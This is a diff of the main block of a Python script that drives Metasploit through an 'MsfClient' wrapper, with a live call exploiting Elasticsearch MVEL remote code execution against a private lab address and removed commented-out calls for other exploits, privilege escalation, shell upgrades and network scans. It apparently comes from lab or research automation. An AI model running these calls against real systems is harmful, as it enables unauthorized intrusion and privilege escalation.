@@ -393,7 +393,8 @@ if __name__ == '__main__':
 
     import random
 
-    msfclient = MsfClient('msfpassword', '192.168.0.100')
+    msfclient = MsfClient('msfpassword')
+    
     # msfclient.exploit_wp_ninja_forms_unauthenticated_file_upload('192.168.1.100')
     msfclient.exploit_elasticsearch_script_mvel_rce('192.168.1.100')
 
@@ -402,39 +403,3 @@ if __name__ == '__main__':
     # msfclient.exploit_phpwiki_ploticus_exec('192.168.1.100')
     # msfclient.privesc_overlayfs_priv_esc('192.168.1.100', 3)
     # msfclient.post_shell_to_meterpreter('192.168.1.100', 8)
-
-
-    # res = msfclient.run_shell_command(1, 'dir', os='windows')
-    # print(f'"{res}"')
-    # msfclient.run_shell_command(9, 'whoami')
-
-    # msfclient.run_shell_command(1, 'whoami')
-    # msfclient.run_shell_command(2, 'whoami')
-
-    # msfclient.exploit_drupal_coder_exec('192.168.2.100')
-    # msfclient.exploit_proftpd_modcopy_exec('192.168.2.100')
-
-    # sessions = msfclient.get_sessions_filtered(ip='192.168.1.100')
-    # session_id = int(random.choice(list(sessions)))
-    # scan = msfclient.scan_pingsweep('192.168.0-2.100-105', session_id)
-    # print(scan)
-
-    # pprint(msfclient.run_msf_command('route'))
-    # pprint(msfclient.get_sessions())
-    # pprint(msfclient.client.sessions)
-
-    # job = msfclient.post_shell_to_meterpreter(1)
-    # res = msfclient.run_shell_command(1, 'whoami')
-    # msfclient.run_shell_command(2, 'whoami')
-    # msfclient.run_shell_command(3, 'whoami')
-    # result = msfclient.privesc_overlayfs_priv_esc(1)
-    # result = msfclient.exploit_phpwiki_ploticus_exec('192.168.1.100')
-    # print(result)
-
-    # # print(msfclient.client.jobs.info(job['job_id']))
-    # msfclient.wait_for_job(job['job_id'])
-
-    # pprint(msfclient.get_sessions())
-
-    # pprint(msfclient.scan_portscan('192.168.0-10.100-110', '22'))
-    # pprint(msfclient.scan_hosts('192.168.0-10.100-110'))
